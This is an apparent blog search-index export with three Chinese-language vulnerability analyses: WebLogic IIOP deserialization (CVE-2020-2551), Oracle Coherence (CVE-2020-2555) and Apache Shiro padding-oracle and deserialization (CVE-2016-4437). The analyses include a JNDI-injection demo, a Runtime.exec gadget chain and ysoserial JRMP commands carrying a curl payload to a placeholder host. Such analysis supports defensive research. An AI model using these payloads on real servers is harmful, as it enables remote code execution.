<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Weblogic IIOP反序列化漏洞分析(CVE-2020-2551)]]></title>
    <url>%2F2020%2F03%2F19%2FWeblogic%20IIOP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[基础IDL与Java IDLIDL（Interface Definition Language）接口定义语言，它主要用于描述软件组件的应用程序编程接口的一种规范语言。它完成了与各种编程语言无关的方式描述接口，从而实现了不同语言之间的通信，这样就保证了跨语言跨环境的远程对象调用。 JAVA IDL是一个分布的对象技术，允许其对象在不同的语言间进行交互。它的实现是基于公共对象代理体系(Common Object Request Brokerage Architecture,CORBA)，一个行业标准的分布式对象模型。每个语言支持CORBA都有他们自己的IDL Mapping映射关系，IDL和JAVA的映射关系可以参考文档Java IDL: IDL to Java Language Mapping 在jdk安装后，会附带有idlj编译器，使用idlj命令可以将IDL文件编译成java文件 COBARCORBA(Common ObjectRequest Broker Architecture)公共对象请求代理体系结构，是由OMG组织制订的一种标准分布式对象结构。其提出是为了解决不同应用间的通信，曾是分布式计算的主流技术。 CORBA结构分为三部分： naming service client side servant side 他们之间的关系简单理解为：client side从naming service中获取服务方servant side信息。servant side需要在naming service中注册，这样client side在要访问具体内容时会先去naming service查找，以找到对应的servant side服务。 可以理解为目录与章节具体内容具体关系：naming service目录，servant side为内容，目的就是为了让client side快速从目录找到内容。 CORBA通信过程在CORBA客户端和服务器之间进行远程调用模型如下： 在客户端，应用程序包含远程对象的引用，对象引用具有存根(stub)方法，存根方法是远程调用该方法的替身。存根实际上是连接到ORB(Object Request Broker)对象请求代理的，因此调用它会调用ORB的连接功能，该功能会将调用转发到服务器。 在服务器端，ORB使用框架代码将远程调用转换为对本地对象的方法调用。框架将调用和任何参数转换为其特定于实现的格式，并调用客户端想要调用的方法。方法返回时，框架代码将转换结果或错误，然后通过ORB将其发送回客户端。 在ORB之间，通信通过IIOP(the Internet Inter-ORB Protocol)互联网内部对象请求代理协议进行。基于标准TCP/IP Internet协议的IIOP提供了CORBA客户端和服务端之间通信的标准。 使用JAVA IDL编写CORBA分布式应用编写IDLCORBA使用IDL供用户描述程序接口， 所以这里第一步就是编写idl描述接口，创建Hello.idl文件：1234567module HelloApp&#123; interface Hello &#123; string sayHello(); &#125;;&#125;; 该段代码描述了Hello接口中包含sayHello()方法，他会返回字符串类型数据。 编译生成client side classes接着使用JAVA的IDL编译器idlj，将idl文件编译成class文件:1idlj -fclient Hello.idl 创建了一个新目录HelloApp，并生成了5个新文件： 他们之间的关系如下图所示： 图片来源：An Introduction To The CORBA And Java RMI-IIOP 参考代码，简单概括一下: HelloOperations接口中定义sayHello()方法 Hello继承了HelloOperations _HelloStub类实现了Hello接口，client side使用hello接口调用servant side。 HelloHelper类实现网络传输，数据编码和解码的工作。 详细分析一下几段核心代码，先来看一下_HelloStub.java中sayHello()的实现：123456789101112131415161718public String sayHello ()&#123; org.omg.CORBA.portable.InputStream $in = null; try &#123; org.omg.CORBA.portable.OutputStream $out = _request (&quot;sayHello&quot;, true); $in = _invoke ($out); String $result = $in.read_string (); return $result; &#125; catch (org.omg.CORBA.portable.ApplicationException $ex) &#123; $in = $ex.getInputStream (); String _id = $ex.getId (); throw new org.omg.CORBA.MARSHAL (_id); &#125; catch (org.omg.CORBA.portable.RemarshalException $rm) &#123; return sayHello ( ); &#125; finally &#123; _releaseReply ($in); &#125;&#125; // sayHello 使用org.omg.CORBA.portable的InputStream和OutputStream来表示调用的请求和响应，通过_request()和_invoke()方法调用得到结果。 另外在HelloHelper类中负责处理对象网络传输的编码和解码，来看一下narrow方法：12345678910111213141516public static HelloApp.Hello narrow (org.omg.CORBA.Object obj)&#123; if (obj == null) return null; else if (obj instanceof HelloApp.Hello) return (HelloApp.Hello)obj; else if (!obj._is_a (id ())) throw new org.omg.CORBA.BAD_PARAM (); else &#123; org.omg.CORBA.portable.Delegate delegate = ((org.omg.CORBA.portable.ObjectImpl)obj)._get_delegate (); HelloApp._HelloStub stub = new HelloApp._HelloStub (); stub._set_delegate(delegate); return stub; &#125;&#125; 接受一个org.omg.CORBA.Object对象作为参数，返回stub。 编译生成servant side执行命令：1idlj -fserver Hello.idl 会生成三个文件，除了HelloPOA.java,其余都是一样的。 POA(Portable Object Adapter)是便携式对象适配器，它是CORBA规范的一部分。这里的这个POA虚类是servant side的框架类，它提供了方法帮助我们将具体实现对象注册到naming service上。 来看一下其核心代码：12345678910111213141516171819202122232425262728293031323334353637383940public abstract class HelloPOA extends org.omg.PortableServer.Servant implements HelloApp.HelloOperations, org.omg.CORBA.portable.InvokeHandler&#123; // Constructors private static java.util.Hashtable _methods = new java.util.Hashtable (); static &#123; _methods.put ("sayHello", new java.lang.Integer (0)); &#125; public org.omg.CORBA.portable.OutputStream _invoke (String $method, org.omg.CORBA.portable.InputStream in, org.omg.CORBA.portable.ResponseHandler $rh) &#123; org.omg.CORBA.portable.OutputStream out = null; java.lang.Integer __method = (java.lang.Integer)_methods.get ($method); if (__method == null) throw new org.omg.CORBA.BAD_OPERATION (0, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE); switch (__method.intValue ()) &#123; case 0: // HelloApp/Hello/sayHello &#123; String $result = null; $result = this.sayHello (); out = $rh.createReply(); out.write_string ($result); break; &#125; default: throw new org.omg.CORBA.BAD_OPERATION (0, org.omg.CORBA.CompletionStatus.COMPLETED_MAYBE); &#125; return out; &#125; // _invoke//... 值得注意的是他也实现了HelloOperations接口，代码的最开始将sayHello方法放入一个hashtable中，_invoke方法中，将调用sayHello()的结果通过org.omg.CORBA.portable.ResponseHandler对象通过网络传输到client side。 此时idjl生成的全部class的关系图： 接下来，要做的就是用户自己实现client side和servant side中具体的方法操作。 servant side实现对于servant side而言，实现一个HelloImpl类来继承HelloPOA类实现sayHello()方法：1234567891011121314151617package HelloApp;import org.omg.CORBA.ORB;public class HelloImpl extends HelloPOA &#123; private ORB orb; public void setORB(ORB orbVal) &#123; orb = orbVal; &#125; @Override public String sayHello() &#123; return "\nHello, world!\n"; &#125;&#125; 此时的继承关系如下： 接着，需要写一个服务端HelloServer类来接受client side对HelloImpl.sayHello()的调用。 三个部分： 第一部分根据传入的name service地址参数来创建，根据CORBA的规范，通过ORB获取一个名称为RootPOA的POA对象。(其中name service由jdk中的orbd提供) 第二部分就是将具体实现类注册到naming service中，用orb获取到name service，将HelloImpl对象以Hello为名绑定。 第三部分就是将server设置为监听状态持续运行，用于拦截并处理client side的请求，返回相应的具体实现类。 Client Side实现12345678910111213141516171819202122232425262728293031package HelloApp;import org.omg.CORBA.ORB;import org.omg.CosNaming.NamingContext;import org.omg.CosNaming.NamingContextExt;import org.omg.CosNaming.NamingContextExtHelper;import org.omg.CosNaming.NamingContextHelper;import java.util.Properties;public class HelloClient &#123; static Hello helloImpl; public static void main(String[] args) throws Exception &#123; ORB orb = ORB.init(args, null); org.omg.CORBA.Object objRef = orb.resolve_initial_references("NameService"); NamingContextExt ncRef = NamingContextExtHelper.narrow(objRef); String name = "Hello"; // helloImpl的类型为_HelloStub，而不是真正的helloImpl helloImpl = HelloHelper.narrow(ncRef.resolve_str(name)); System.out.println(helloImpl.sayHello()); &#125;&#125; 首先和服务端一样，需要初始化ORB，通过ORB来获取NameService并将其转换成命名上下文。之后通过别名在命名上下文中获取其对应的Stub，调用Stub中的sayhello()方法，这个时候才会完成client side向servant side发送请求，POA处理请求，并将具体实现的HelloImpl包装返回给client side。 naming service实现ORBD可以理解为ORB的守护进程(daemon)，其主要负责建立客户端(client side)与服务端(servant side)的关系，同时负责查找指定的IOR(可互操作对象引用，是一种数据结构，是CORBA标准的一部分)。ORBD是由Java原生支持的一个服务，其在整个CORBA通信中充当着naming service的作用，可以通过一行命令进行启动：1orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1 执行接着分别在HelloServer和HelloClient配置name service地址： 其次依次启动name service、HelloServer、HelloClient结果如上图所示。 此外，除了上述先获取NameServer，后通过resolve_str()方法生成(NameServer方式)的stub，还有两种： 使用ORB.string_to_object生成（ORB生成方式） 使用javax.naming.InitialContext.lookup()生成（JNDI生成方式） 代码分别如下:orb方式1234567891011public class HelloClietORB &#123; static Hello helloImpl; public static void main(String[] args) throws Exception &#123; ORB orb = ORB.init(args, null); org.omg.CORBA.Object obj = orb.string_to_object("corbaname::127.0.0.1:1050#Hello"); Hello hello = HelloHelper.narrow(obj); System.out.println(hello.sayHello()); &#125;&#125; 1234567891011121314public class HelloClientORB2 &#123; static Hello helloImpl; public static void main(String[] args) throws Exception &#123; ORB orb = ORB.init(args, null); org.omg.CORBA.Object obj = orb.string_to_object("corbaloc::127.0.0.1:1050"); NamingContextExt ncRef = NamingContextExtHelper.narrow(obj); Hello hello = HelloHelper.narrow(ncRef.resolve_str("Hello")); System.out.println(hello.sayHello()); &#125; &#125; JDNI方式：12345678910111213public class HelloClientJNDI &#123; static Hello helloImpl; public static void main(String[] args) throws Exception &#123; ORB orb = ORB.init(args, null); Hashtable env = new Hashtable(5, 0.75f); env.put("java.naming.corba.orb", orb); Context ic = new InitialContext(env); Hello helloRef = HelloHelper.narrow((org.omg.CORBA.Object)ic.lookup("corbaname::127.0.0.1:1050#Hello")); System.out.println(helloRef.sayHello()); &#125;&#125; CORBA网络流量分析servant side服务端流量大致分为两个部分： 获取Naming Service 注册servant side 获取Naming Service的流量如下：在返回的响应中，拿到了RootPOA：对应的代码为： 接着检测获取到的NamingService对象是否为NamingContextExt类的示例：对应代码： 最后发送op=to_name和op=rebind两个指令：分别为设置引用名，和设置绑定信息，来看一下op=rebind的数据包：这里通过IOR信息表示了servant side的相关rpc信息。 client side这里以NameServer方式生成stub为例： 获取nameservice、op=_is_a判断 根据引用名获取servant side的接口Stub 发送方法名，调用远程方法，得到结果分别对应代码步骤： RMI-IIOPRMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。RMI-IIOP综合了RMI和CORBA的优点，克服了他们的缺点，使得程序员能更方便的编写分布式程序设计，实现分布式计算。 Demo: RMI-IIOP远程调用参考文档Tutorial: Getting Started Using RMI-IIOP所述，一共四个步骤，对应的文件如下： 定义远程接口类：HelloInterface.java 编写实现类：HelloImpl.java, 实现接口HelloInterface 编写服务端类：HelloServer.java, RMI服务端实例远程类，将其绑定到name service中 编写客户端类：HelloClient.java, 调用远程方法sayHello() 实现接口类，必须要实现Remote远程类，且抛出java.rmi.RemoteException异常。HelloInterface.java12345import java.rmi.Remote;public interface HelloInterface extends java.rmi.Remote &#123; public void sayHello( String from ) throws java.rmi.RemoteException;&#125; 实现接口类，必须写构造方法调用父类构造方法，给远程对象初始化使用，同时要实现一个方法给远程调用使用(sayHello())HelloImpl.java123456789101112import javax.rmi.PortableRemoteObject;public class HelloImpl extends PortableRemoteObject implements HelloInterface &#123; public HelloImpl() throws java.rmi.RemoteException &#123; super(); // invoke rmi linking and remote object initialization &#125; public void sayHello( String from ) throws java.rmi.RemoteException &#123; System.out.println( "Hello from " + from + "!!" ); System.out.flush(); &#125;&#125; 编写服务端，创建servant实例，绑定对象。HelloServer.java1234567891011121314151617181920212223242526272829303132import javax.naming.Context;import javax.naming.InitialContext;import javax.naming.NamingException;import java.util.Hashtable;public class HelloServer &#123; public final static String JNDI_FACTORY = "com.sun.jndi.cosnaming.CNCtxFactory"; public static void main(String[] args) &#123; try &#123; //实例化Hello servant HelloImpl helloRef = new HelloImpl(); //使用JNDI在命名服务中发布引用 InitialContext initialContext = getInitialContext("iiop://127.0.0.1:1050"); initialContext.rebind("HelloService", helloRef); System.out.println("Hello Server Ready..."); Thread.currentThread().join(); &#125; catch (Exception ex) &#123; ex.printStackTrace(); &#125; &#125; private static InitialContext getInitialContext(String url) throws NamingException &#123; Hashtable env = new Hashtable(); env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY); env.put(Context.PROVIDER_URL, url); return new InitialContext(env); &#125;&#125; 编写客户端类，远程调用sayHello()方法。HelloClient.java1234567891011121314151617181920212223242526272829303132333435import javax.naming.Context;import javax.naming.InitialContext;import javax.rmi.PortableRemoteObject;import java.util.Hashtable;public class HelloClient &#123; public static void main( String args[] ) &#123; Context ic; Object objref; HelloInterface hi; try &#123; Hashtable env = new Hashtable(); env.put("java.naming.factory.initial", "com.sun.jndi.cosnaming.CNCtxFactory"); env.put("java.naming.provider.url", "iiop://127.0.0.1:1050"); ic = new InitialContext(env); // STEP 1: Get the Object reference from the Name Service // using JNDI call. objref = ic.lookup("HelloService"); System.out.println("Client: Obtained a ref. to Hello server."); // STEP 2: Narrow the object reference to the concrete type and // invoke the method. hi = (HelloInterface) PortableRemoteObject.narrow( objref, HelloInterface.class); hi.sayHello( " MARS " ); &#125; catch( Exception e ) &#123; System.err.println( "Exception " + e + "Caught" ); e.printStackTrace( ); &#125; &#125;&#125; 编译编译远程接口实现类:1javac -d . -classpath . HelloImpl.java 给实现类创建stub和skeleton(简单理解即jvm中的套接字通信程序)：1rmic -iiop HelloImpl 执行完后会创建两个文件： _HelloInterface_Stub.class： 客户端的stub _HelloImpl_Tie.class：服务端的skeleton 编译：1javac -d . -classpath . HelloInterface.java HelloServer.java HelloClient.java 运行开启Naming Service：1orbd -ORBInitialPort 1050 -ORBInitialHost 127.0.0.1 运行客户端服务端：12java -classpath . HelloServerjava -classpath . HelloClient 上述客户端服务端代码如果在InitialContext没传入参数可以像文档中所述通过java -D传递 结果 漏洞复现weblogic10.3.6版本，jdk8u73版本 采坑，记得weblogic版本、rmi服务、exp版本都一致 EXP：https://github.com/Y4er/CVE-2020-2551 漏洞分析这个该漏洞借助IIOP协议触发反序列化，结合对JtaTransactionManager类的错误过滤，导致可以结合其触发其类的JNDI注入造成RCE的效果。 JtaTransactionManager Gadget分析weblogic中自带的一个Spring框架的包：/com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObject在反序列化调用readObject时，会调用initUserTransactionAndTransactionManager方法：接着调用this.lookupUserTransaction方法，传入成员变量this.userTransactionName: 获取this.getJndiTemplate()后，在/com/bea/core/repackaged/springframework/jndi/JndiTemplate#lookup中到这里通过控制userTransactionName属性，进行JNDI注入： demo:12345678910111213141516171819202122232425262728public class jnditest &#123; public static void main(String[] args)&#123; JtaTransactionManager jtaTransactionManager = new JtaTransactionManager(); jtaTransactionManager.setUserTransactionName("rmi://127.0.0.1:1099/Exploit"); serialize(jtaTransactionManager); deserialize(); &#125; public static void serialize(Object obj) &#123; try &#123; ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("jndi.ser")); os.writeObject(obj); os.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125; public static void deserialize() &#123; try &#123; ObjectInputStream is = new ObjectInputStream(new FileInputStream("jndi.ser")); is.readObject(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; 后来翻了一下资料，在CVE-2018-3191中使用的就是该gadget，当时结合T3协议进行反序列化，修复方案将JtaTransactionManager的父类AbstractPlatformTransactionManager加入到黑名单列表了，T3协议使用的是resolveClass方法去过滤的,resolveClass方法是会读取父类的,所以T3协议这样过滤是没问题的。但是在IIOP协议这里，也是使用黑名单进行过滤，但不是使用resolveClass方法去判断的，这样默认只会判断本类的类名，而JtaTransactionManager类是不在黑名单列表里面的,它的父类才在黑名单列表里面,这样就可以反序列化JtaTransactionManager类了，从而触发JNDI注入。 Context的生成以及bind的流程(servant side)在上文中RMI-IIOP的客户端demo中，分为三个步骤： 从Name Service中获取Conetext对象 从Name Service中查询指定名称所对应的引用 调用远程方法 先来看第一个过程，无论是客户端还是服务端都要进行的的一个步骤：InitialContext方法中将env参数传入，进行初始化：经过几次调用，一直跟进到javax/naming/spi/NamingManager.java#getInitialContext方法可以看到在这里将我们传入的env对应的工厂类进行获取，我们来找一下，在weblogic中有多少个可以加载的工厂类，找到InitialContextFactory接口(ctrl+h查看依赖树) 这里直接来看WLInitialContextFactory类： /wlserver_10.3/server/lib/wls-api.jar!/weblogic/jndi/Environment#getContext getInitialContext方法中，到这里其实就是CORBA的解析流程了， 简单跟一下string_to_object方法，这里其实就是上文中CORBA的stub生成三种方式所对应的协议： IOR Corbaname Corbaloc 再来看getORBReference方法，其实就是CORBA初始化orb获取Name Service的过程：对应CORBA中代码：再来看一下Conetext的绑定过程：/corba/j2ee/naming/ContextImpl可以看到这个过程其实就是CORBA生成IOR的过程，指定java类型交互的约定为tk_value，设定op为rebind_any，存储序列化数据到any类，待client side调用。 其实在分析这里之前一直有一个问题无法理解，一直以为weblogic是orbd+servant side，而我们写的exp是client side，在和@Lucifaer师傅学习后，其实对于weblogic的orbd而言，servant side和client side都是客户端，而weblogic(orbd)是在处理servant side的时候解析数据造成反序列化的问题。 到这里servant side的注册就结束了，下面来分析一下weblogic是如何对其进行解析的。 weblogic解析流程weblogic解析请求的入口开始：weblogic/rmi/internal/wls/WLSExecuteRequest#run完整调用栈在下文，这里选取几个比较关键的点来分析：weblogic/corba/idl/CorbaServerRef#invoke先是判断请求类型是否为objectMethods已经存在的，这里是rebind_any，不存在则调用this.delegate._invoke方法，然后将方法类型，IIOPInputStream数据传入_invoke函数：rebind_any指令类型对应的var5为1，进入var2.read_any()这里的this.read_TypeCode()即上文中Context bind中的tk_value设置的交互类型，在weblogic/corba/idl/AnyImpl#read_value_internal对应case 30，同时这里的Any类型，在上文Context分析中正式我们将序列化数据插入的地方。 跟进weblogic/corba/utils/ValueHandlerImpl 在这里var2为ObjectStreamClass，调用其readObject方法。继续跟readObject：反射调用JtaTransactionManager的readObject：com/bea/core/repackaged/springframework/transaction/jta/JtaTransactionManager#readObject最后就是jndi注入了： 完整调用栈： EXP分析在分析EXP时个人有一点疑惑，记录一下分析和解决的过程。 参考Y4er/CVE-2020-2551，这里我们结合IIOP servant side的demo来看： 上图为EXP，下图为IIOP服务端，这里有一点需要注意的是，在demo中HelloImpl类继承了HelloInterface实现了java.rmi.Remote远程类的继承： 回过头来看JtaTransactionManager类的接口：正是这个原因才需要我们在编写EXP的时候，需要将jtaTransactionManager通过反射，动态转换成remote达到远程调用的目的。 最后在自己动手分析之前，我一直把weblogic当成servant side和orbd(name Service)，也无法理解为什么EXP要和COBAR的servant side一样用rebind注册，后来在@Lucifaer师傅的帮助下才理解这里没有client side的参与，而对于Name Service而言这两者都是客户端。 其次这种漏洞IIOP只是载体，JtaTransactionManager为gadget，官方修复也仅仅只是添加黑名单，IIOP的问题没根本解决，再爆一个gadget又得修，问题源源不断。更坑爹的是官网直接下的weblogic连黑名单都没有，个人觉得防御这种问题单纯靠waf流量检测根本防不住，没有反序列化特征，二进制数据流。要防范这类新问题的产生，或许只有RASP的行为检测才能解决。 最后感谢@Lucifaer师傅的帮助~ 参考文章： 关于 Java 中的 RMI-IIOP Tutorial: Getting Started Using RMI-IIOP An Introduction To The CORBA And Java RMI-IIOP Java IDL: IDL to Java Language Mapping]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2020-2555：weblogic反序列化漏洞分析]]></title>
    <url>%2F2020%2F03%2F11%2FCVE-2020-2555%EF%BC%9Aweblogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[背景2020年3月6日，Oracle Coherence 反序列化远程代码执行漏洞（CVE-2020-2555）的细节被公开，Oracle Coherence为Oracle融合中间件中的产品，在WebLogic 12c及以上版本中默认集成到WebLogic安装包中，攻击者通过t3协议发送构造的序列化数据，能过造成命令执行的效果。 环境搭建参考官方发的补丁公告：Oracle Critical Patch Update Advisory - January 2020 Description 这里我们用12.2.1.4测试，拉到idea中，动态调试环境参考：WebLogic-XMLDecoder反序列化分析 漏洞分析主要参考这篇文章来构建gadgets，CVE-2020-2555: RCE THROUGH A DESERIALIZATION BUG IN ORACLE’S WEBLOGIC SERVER 根据文章所述的source点，cmd + o快速定位到/coherence_3.7/lib/coherence.jar!/com/tangosol/util/filter/LimitFilter.class文章中diff的函数就是这个toString函数了，补丁中去掉了该函数所有的extractor.extract方法： toString()方法，在很多JRE的class中readObject方法都有实现，比如：javax/management/BadAttributeValueExpException.java 这个点和common-collection5的gadget很像，参考文章：https://y4er.com/post/ysoserial-commonscollections-5/ 接着就是寻找哪个可序列化class中的有extract函数，且方便构造命令执行的，一般来说有这么些点： Runtime.exec() Method.invoke() RMI/JNDI/JRMP 在com/tangosol/util/extractor/ReflectionExtractor.class中实现了Method.invoke()的调用： 这里读过common-collection5的都会熟悉，接下来就要找一个链式调用的点，构造命令执行: /com/tangosol/util/extractor/ChainedExtractor.class 编写EXP到这里基本已经分析完了，EXP编写参考这个完成gadget调用链：12345678910111213ObjectInputStream.readObject() BadAttributeValueExpException.readObject() LimitFilter.toString() ChainedExtractor.extract() ReflectionExtractor.extract() Method.invoke() Class.getMethod() ReflectionExtractor.extract() Method.invoke() Runtime.getRuntime() ReflectionExtractor.extract() Method.invoke() Runtime.exec() 这个漏洞基本思路和common-collection一样，编写EXP只有一点点差异，仔细读代码理解调用关系就好了，这里就不公开EXP了。 最后因为是参考分析写的EXP，分析文章中关键类的位置已经给出了，个人感觉挖掘漏洞过程中最重要的点还是寻找数据传输的过程，之后的学习得在寻找gadget调用关系上多研究研究。]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Shiro 反序列化漏洞分析]]></title>
    <url>%2F2020%2F03%2F08%2FShiro%20Padding%20Oracle%20Attack%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%2F</url>
    <content type="text"><![CDATA[基础参考ctfwiki中对CBC模式的介绍，先看一下CBC模式下的加解密模式图： 简单概括一下，加密过程初始化向量IV和第一组明文进行异或，然后经过加密算法得到第一组密文，并拿它作为下一分组加密的IV向量，迭代下去。解密过程反之，先解密再和IV向量异或得到明文plaintext。这里的IV参数是一个随机值(长度和分组长度等长)，为了保证多次加密相同数据生成的密文不同而设计的。 为了方便后文描述，将IV和Planttext异或后的值称为中间intermediary Value。 分组的填充padding分组的长度，不同加密算法的长度如下图所示： 分组密码(block cipher)需要保证总长度是分组长度的整数倍，但一般在最后一组会出现长度不够分组长度的情况，这时候就需要使用padding填充，填充的规则是在最后填充一个固定的值，值的大小为填充的字节总数，即需最后还差2个字节，则填充两个0x02。下边8个字节的填充范围为0x01-0x08。 这种Padding原则遵循的是常见的PKCS#5标准。https://www.di-mgt.com.au/cryptopad.html#PKCS5 Padding Oracle Attack利用条件 攻击者知道密文和初始向量IV padding错误和padding正确服务器可返回不一样的状态 攻击效果正常CBC解密需要知道IV、Key、密文，而通过Padding Oracle漏洞，只用知道IV、密文即可获得明文。 demo以这样一个程序为例：1https://sampleapp/home.jsp?UID=0000000000000000EFC2807233F9D7C097116BB33E813C5E 前16个字母(8字节)0000000000000000为IV，后32字母(16字节)为密文： padding 0x01通常程序校验padding是否正确是通过检查末尾的那个字节的值，我们可以通过修改IV的值使得其与中间量intermediary Value异或得到的结果(plaintext)最后一个字节(填充位)为0x01。 实现这样一个穷举的过程，需要改变IV的最后一个字节(最多255次)，且需要服务端将判断padding校验的结果返回给客户端(类似于布尔注入的逻辑)。比如在web应用中，padding正确(解密的内容不正确)返回200，padding错误(解密内容错误)返回500。 至此通过上述步骤，我们可以通过IV(fuzz出的IV)和0x01异或得到intermediary Value中间值。 在单个分组的情况下，其实我们拿着intermediary Value和初始向量IV异或，即可拿到最后明文的最后一个字节： padding 0x02此时，通过修改IV第八个字节的值使得最后一个padding位变成0x02(上图中0x67^0x02=0×64)，再fuzz IV第七个字节，使得服务端解出plaintext其填充位为0x02，以此类推。 总的来说，其实攻击的本质都是为了得到中间临时变量intermediary value，通过其和初始IV计算出明文。 多分组密文情况上面说到的Padding Oracle Attack是以单个分组进行的，如果密文有多个分组，其最大的区别在于这一分组加密的初始IV向量为上次组加密的结果Ciphertext。 在多分组密文中，由于密文和IV已知且可控，先拿第一组padding的方式爆破IV推算intermediary value，然后根据原始IV计算出明文，也可以通过修改原始IV控制密文结果；再拿第一二组，用padding的方式爆破intermediary value，此时的初始IV为第一组的密文，以此类推。 防御漏洞的关键点在于攻击者能够判断其padding的结果，在使用CBC模式的分组加密算法需要注意这一点，比如让服务端加上异常处理等等。 实验代码：Demo CBC字节反转在乌云知识库里有一篇文章的例子说的比较清晰：CBC字节翻转攻击-101Approach，再来参考ctfwiki中对CBC模式的介绍：简单来说，通过构造第n的密文块为C(n) xor P(n+1) xor A，使得第n+1密文块为A(个人觉得CTFWiki这里写错了)，为什么呢？ C(n) xor P(n+1)的结果实际上就是第n+1组的intermediary value，在解密时让intermediary value自己异或自己得全0，然后再异或A得A。如下图所示： 简而言之，通过损坏密文字节来改变明文字节，攻击条件为知道一组明文和密文。 CVE-2016-4437: Shiro 反序列化(Shiro &lt;= 1.2.4)Apache Shiro是一个开源安全框架，提供身份验证、授权、密码学和会话管理。在Apache Shiro &lt;= 1.2.4版本中存在反序列化漏洞。 环境搭建去github上下一个shiro 1.2.4:123git clone https://github.com/apache/shiro.gitcd shirogit checkout shiro-root-1.2.4 然后修改shiro/samples/web/pom.xml12345678910111213141516171819202122&lt;!-- 需要设置编译的版本 --&gt; &lt;properties&gt; &lt;maven.compiler.source&gt;1.8&lt;/maven.compiler.source&gt; &lt;maven.compiler.target&gt;1.8&lt;/maven.compiler.target&gt; &lt;/properties&gt; &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;jstl&lt;/artifactId&gt; &lt;!-- 这里需要将jstl设置为1.2 --&gt; &lt;version&gt;1.2&lt;/version&gt; &lt;scope&gt;runtime&lt;/scope&gt; &lt;/dependency&gt; · &lt;!--加一个gadget--&gt; &lt;dependency&gt; &lt;groupId&gt;org.apache.commons&lt;/groupId&gt; &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt; &lt;version&gt;4.0&lt;/version&gt; &lt;/dependency&gt;&lt;dependencies&gt; 编译：sudo mvn package 爆了这样的错：先得去搞个jdk1.6来，mac下弃用了，参考这篇文章：https://blog.csdn.net/q258523454/article/details/84029886，去这里下[mac的jdk1.6][6]。 然后切换到root创一个文件：/var/root/.m2/toolchains.xml12345678910111213141516&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;toolchains xmlns="https://maven.apache.org/TOOLCHAINS/1.1.0" xmlns:xsi="https://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="https://maven.apache.org/TOOLCHAINS/1.1.0 https://maven.apache.org/xsd/toolchains-1.1.0.xsd"&gt;&lt;!--插入下面代码--&gt; &lt;toolchain&gt; &lt;type&gt;jdk&lt;/type&gt; &lt;provides&gt; &lt;version&gt;1.6&lt;/version&gt; &lt;vendor&gt;sun&lt;/vendor&gt; &lt;/provides&gt; &lt;configuration&gt; &lt;!--这里是你安装jdk的文件目录--&gt; &lt;jdkHome&gt;/Library/Java/JavaVirtualMachines/1.6.0.jdk/&lt;/jdkHome&gt; &lt;/configuration&gt; &lt;/toolchain&gt;&lt;/toolchains&gt; 再编译就能成功了： 将这个war包放到tomcat的webapp目录下，然后访问https://127.0.0.1:8080/shiro/会自动解压：samples-web-1.2.4 也可以把它导到idea里打包，接着配置idea，这里踩了坑EDU版本是没有tomcat server的，一定要用旗舰版： 漏洞复现EXP打ysoserial的二链：shiro1.2.4RCE 代码分析加密先下个断点：org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin，去login.jsp登录root secret，选中Remember Me。在forgetIdentity函数中处理了request和response请求，在response中处理remember me的cookie。再跟进rememberIdentity函数：调用convertPrincipalsToBytes将账户信息传入，先是进行序列化，再来一个加密：跟进encrypt函数：getCipherService先获取了一下加密服务的配置信息，包括加密模式，填充方式，加密类型等等：cipherService.encrypt其中秘钥在AbstractRememberMeManager.java中设置的一个定值：通过构造方法设置的： 在加密过程中需要关注的一个点，将iv向量放置在密文头部：org/apache/shiro/crypto/JcaCipherService.java 加密完成后，返回结果传入rememberSerializedIdentity函数，处理http请求，返回cookie到response中： 到这里cookie加密处理就结束了，再来跟一下是如何解密cookie的。 解密org/apache/shiro/mgt/AbstractRememberMeManager.java#getRememberedPrincipals先从getRememberedSerializedIdentity函数获取cookie，base64解码： 然后进入convertBytesToPrincipals函数，先是解密，接着反序列化 坑点：反序列化限制网上大部分文章都是拿common-collections2这调链来复现，畅通无阻。 我们来试试其他链，把gadget换成ysoserial5打shiro自带的commons-collections-3.2.1，会抛出这样一个错误： 再把其组件拉出来单独试试： 调试分析一下：org/apache/shiro/io/DefaultSerializer.java跟进ClassResolvingObjectInputStream类：org/apache/shiro/io/ClassResolvingObjectInputStream.java他继承了ObjectInputStream类，重写了resolveClass方法，再来看一下原版resolveClass方法： Class.forName和ClassUtils.forName的差别，来看看ClassUtils具体实现：org/apache/shiro/util/ClassUtils.java#forNameshiro不是像原版那样通过java.lang.Class反射获取class，而是通过ParallelWebappClassLoader去加载class查了一些下资料，看到orange师傅文章评论中说不支持装载数组类型，这里没细跟原因了。 JRMP绕过Orang师傅在文章中一顿操作，发现JRMP可以避开上述限制，测试一下： server：1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 12345 CommonsCollections5 'curl https://x.x.x.x:8989' client:1java -jar ysoserial.jar JRMPClient &apos;x.x.x.x:12345&apos; 稍微调了一下EXP,大概能行的原因就是走的远程的class加载的，而不是像之前那样直接打本地： 